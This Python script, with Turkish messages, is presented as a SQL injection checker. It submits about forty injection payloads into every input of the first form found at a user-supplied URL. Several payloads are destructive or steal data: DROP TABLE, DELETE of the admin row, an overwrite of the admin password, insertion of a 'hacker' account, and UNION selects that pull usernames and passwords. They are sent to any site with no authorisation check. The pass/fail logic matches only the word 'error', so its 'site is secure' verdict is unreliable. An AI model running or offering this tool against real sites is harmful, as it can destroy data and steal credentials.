import requests
from bs4 import BeautifulSoup
import urllib.parse

url = input("Lütfen kontrol etmek istediğiniz web sitesinin URL'sini girin: ")

parsed_url = urllib.parse.urlparse(url)
if not (parsed_url.scheme and parsed_url.netloc):
    print("Geçersiz URL")
    exit()

try:
    response = requests.get(url)
except requests.exceptions.RequestException as e:
    print(f"URL isteği sırasında bir hata oluştu: {e}")
    exit()

soup = BeautifulSoup(response.text, 'html.parser')
form = soup.find('form')
if not form:
    print("Web sitesinde form bulunamadı.")
    exit()

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "' OR '1'='1'; --",
    "' OR '1'='1'; DROP TABLE users; --",
    "' OR '1'='1'; SELECT * FROM users; --",
    "' OR '1'='1'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
    "' OR '1'='1'; UPDATE users SET password='hacked' WHERE username='admin'; --",
    "' OR '1'='1'; DELETE FROM users WHERE username='admin'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE username='' OR '1'='1'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE password='' OR '1'='1'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE email='' OR '1'='1'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE role='' OR '1'='1'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE username = '' OR '1'='1'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE password = '' OR '1'='1'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE email = '' OR '1'='1'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE role = '' OR '1'='1'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE username LIKE '%admin%'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE password LIKE '%password%'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE email LIKE '%email%'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE role LIKE '%admin%'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE username LIKE '%admin%'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE password LIKE '%password%'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE email LIKE '%email%'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE role LIKE '%admin%'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE username LIKE '%admin%' AND '1'='1'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE password LIKE '%password%' AND '1'='1'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE email LIKE '%email%' AND '1'='1'; --",
    "' OR '1'='1'; SELECT * FROM users WHERE role LIKE '%admin%' AND '1'='1'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE username LIKE '%admin%' AND '1'='1'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE password LIKE '%password%' AND '1'='1'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE email LIKE '%email%' AND '1'='1'; --",
    "' OR '1'='1'; SELECT username, password FROM users WHERE role LIKE '%admin%' AND '1'='1'; --",
    "' UNION SELECT NULL, username FROM users --",
    "' UNION SELECT password, NULL FROM users --",
    "' UNION SELECT email, NULL FROM users --",
    "' UNION SELECT role, NULL FROM users --",
    "' UNION SELECT username, password FROM users --",
    "' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --",
]

vulnerable = False
for payload in payloads:
    data = {}
    for input_tag in form.find_all('input'):
        input_name = input_tag.get('name')
        if input_name:
            data[input_name] = payload

    try:
        if form.get('method') == 'post':
            response = requests.post(url, data=data)
        else:
            response = requests.get(url, params=data)
    except requests.exceptions.RequestException as e:
        print(f"İstek sırasında bir hata oluştu: {e}")
        continue

    if "error" in response.text.lower():
        print(f'Web sitesi SQL enjeksiyon saldırılarına karşı savunmasız: {payload}')
        vulnerable = True

if not vulnerable:
    print('Web siteniz güvenli.')
